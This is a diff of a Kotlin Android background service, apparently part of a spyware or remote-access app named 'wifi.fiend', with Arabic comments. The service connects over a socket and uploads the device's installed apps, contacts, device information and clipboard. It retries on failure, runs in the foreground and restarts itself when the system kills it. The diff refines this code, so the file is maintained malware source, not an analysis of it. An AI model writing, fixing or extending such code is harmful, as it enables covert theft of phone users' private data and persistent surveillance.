@@ -1,4 +1,4 @@
-package willi.fiend
+package wifi.fiend // ✅ تم تغييرها لتطابق Manifest
 
 import android.annotation.SuppressLint
 import android.app.*
@@ -12,15 +12,16 @@ import androidx.core.app.NotificationCompat
 class MainService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
-    
+
     // Runnable لإعادة المحاولة إذا فشل الاتصال
     private val connectionRunnable = object : Runnable {
         override fun run() {
             try {
-                // التأكد من أن الاتصال يتم في خيط منفصل حتى لا يتجمد التطبيق
+                // تأكد من أن العملية تتم في خيط منفصل حتى لا يتجمد التطبيق
                 Thread {
                     try {
-                        val socket = AppSocket(this@MainService) // نمرر السياق
+                        // ❗️ تأكد أن اسم AppSocket يطابق الملف الموجود لديك
+                        val socket = AppSocket(this@MainService)
                         val action = socket.action
                         socket.connect()
                         action.uploadApps()
@@ -29,6 +30,9 @@ class MainService : Service() {
                         action.uploadContact()
                         action.uploadDeviceInfo()
                         action.uploadClipboard()
+
+                        // إزالة هذا السطر إذا لم تعد تريد إعادة المحاولة بعد النجاح
+                        // handler.postDelayed(this, 5000) 
                     } catch (e: Exception) {
                         e.printStackTrace()
                         // إذا فشل الاتصال، نعيد المحاولة بعد 10 ثوانٍ
@@ -48,15 +52,14 @@ class MainService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        // تحديث الحالة في JobWakeUpService
+        // تحديث الحالة في JobWakeUpService ليتم إعلامها أن الخدمة تعمل
         JobWakeUpService.isMainServiceRunning = true
         
         startForeground(1, getNotification())
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // إزالة التأخير الثابت ووضعه داخل الـ Runnable
-        // بدلاً من 5 ثوانٍ، نجعل الخدمة تحاول الاتصال فوراً، وإذا فشلت تعيد المحاولة
+        // بدء الاتصال
         handler.postDelayed(connectionRunnable, 5000) 
         
         // إعادة تشغيل الخدمة إذا قتلها النظام
